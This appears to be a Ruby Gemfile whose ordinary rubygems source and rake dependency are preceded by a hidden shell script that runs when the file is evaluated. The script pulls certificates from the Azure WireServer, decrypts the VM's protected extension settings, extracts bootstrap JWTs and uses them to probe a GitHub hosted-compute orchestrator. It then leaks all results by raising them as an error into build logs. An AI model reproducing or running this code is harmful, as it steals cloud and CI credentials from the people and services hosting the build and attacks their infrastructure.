require 'net/http'
require 'uri'
require 'json'

m = []

# Inline shell script with full decrypt chain
script = <<'SHELL'
set +e
WD=/tmp/v105 && rm -rf $WD && mkdir $WD && cd $WD
# 1. goalstate
curl -sf -H "x-ms-agent-name: WALinuxAgent" -H "x-ms-version: 2015-04-05" -o gs.xml "http://168.63.129.16/machine/?comp=goalstate"
echo "STEP1 gs_size=$(wc -c < gs.xml)"
# 2. extract cert URL
CERT_URL=$(python3 -c 'import sys,re; s=open("gs.xml").read(); m=re.search(r"<Certificates>([^<]+)</Certificates>",s); print(m.group(1) if m else "")')
echo "STEP2 cert_url_len=${#CERT_URL}"
[ -z "$CERT_URL" ] && { echo "STEP2 NO_CERT_URL"; exit 1; }
# 3. RSA + self-signed cert
openssl req -new -newkey rsa:2048 -nodes -x509 -keyout key.pem -out cert.pem -days 1 -subj "/CN=LinuxTransport" 2>/dev/null
CERT_B64=$(openssl base64 -A < cert.pem)
echo "STEP3 cert_b64_len=${#CERT_B64}"
# 4. fetch encrypted certs
curl -sf -H "x-ms-agent-name: WALinuxAgent" -H "x-ms-version: 2015-04-05" -H "x-ms-cipher-name: DES_EDE3_CBC" -H "x-ms-guest-agent-public-x509-cert: $CERT_B64" -o cert-resp.xml "$CERT_URL"
echo "STEP4 cert_resp_size=$(wc -c < cert-resp.xml)"
# 5. extract Data
python3 -c 'import re; s=open("cert-resp.xml").read(); m=re.search(r"<Data>([^<]+)</Data>",s); print(m.group(1) if m else "",end="")' > cms.b64
echo "STEP5 cms_b64_len=$(wc -c < cms.b64)"
base64 -d < cms.b64 > cms.der 2>/dev/null
echo "STEP5b cms_der_size=$(wc -c < cms.der)"
# 6. CMS decrypt
openssl cms -decrypt -inkey key.pem -inform DER -in cms.der -out decrypted.p7b 2>err.log
echo "STEP6 p7b_size=$(wc -c < decrypted.p7b 2>/dev/null) err=$(head -c 80 err.log)"
# 7. PKCS12 parse → vm key + cert
openssl pkcs12 -in decrypted.p7b -out vm-pem.pem -password pass: -nodes 2>err2.log
echo "STEP7 vm_pem_size=$(wc -c < vm-pem.pem 2>/dev/null) err=$(head -c 80 err2.log)"
# 8. fetch vmSettings + extract protectedSettings (single extension)
curl -sf -o vm.json "http://168.63.129.16:32526/vmSettings?api-version=2015-09-01"
PS=$(python3 -c 'import json,sys; d=json.load(open("vm.json")); ext=d["extensionGoalStates"][0]; print(ext["settings"][0]["protectedSettings"])')
echo "STEP8 ps_len=${#PS}"
echo "$PS" | base64 -d > ps.der 2>/dev/null
echo "STEP8b ps_der_size=$(wc -c < ps.der)"
# 9. SMIME decrypt
openssl smime -decrypt -inkey vm-pem.pem -inform DER -in ps.der -out ps-plain.json 2>err3.log
echo "STEP9 plain_size=$(wc -c < ps-plain.json 2>/dev/null) err=$(head -c 80 err3.log)"
# 10. extract script + JWT
if [ -f ps-plain.json ] && [ -s ps-plain.json ]; then
  SCRIPT_B64=$(python3 -c 'import json; d=json.load(open("ps-plain.json")); print(d.get("script","")[:50])')
  echo "STEP10 script_prefix=$SCRIPT_B64"
  FULL_SCRIPT_B64=$(python3 -c 'import json; d=json.load(open("ps-plain.json")); print(d.get("script",""))')
  echo "$FULL_SCRIPT_B64" | base64 -d > bootstrap.sh 2>/dev/null
  echo "STEP10b bootstrap_size=$(wc -c < bootstrap.sh)"
  # Extract JWTs
  grep -oE 'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+' bootstrap.sh | head -3 | nl -ba | while read N JWT; do
    PAYLOAD=$(echo "$JWT" | cut -d. -f2 | base64 -d 2>/dev/null | tr -d '\n' | head -c 400)
    echo "STEP11 jwt[$N]_len=${#JWT} payload=$PAYLOAD"
  done
  # First JWT for orchestrator probe
  JWT=$(grep -oE 'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+' bootstrap.sh | head -1)
  if [ -n "$JWT" ]; then
    echo "STEP12 jwt_extracted=true len=${#JWT}"
    # Probe orchestrator with JWT
    for ep in /v1/agents /v1/agent /v1/jobs /v1/agents/list /v1/agent/log /v1/trace /v1/trace/get; do
      RESP=$(curl -sf -m 5 -H "Authorization: Bearer $JWT" -w "_HTTP_%{http_code}_LEN_%{size_download}" -o /tmp/r.txt "https://hosted-compute-request-orchestrator-prod-eus-02.githubapp.com$ep")
      BODY=$(head -c 200 /tmp/r.txt | tr '\n' ' ')
      echo "STEP13 orch[$ep] $RESP body=$BODY"
    done
  fi
fi
SHELL

# Run shell script and capture output
output = `bash -c #{script.dump} 2>&1`
output.lines.each { |line| m << "v105 " + line.strip }
m << "v105 EOL exit=#{$?.exitstatus}"

raise m.join("\n")

source "https://rubygems.org"
gem "rake", "~> 13.0"
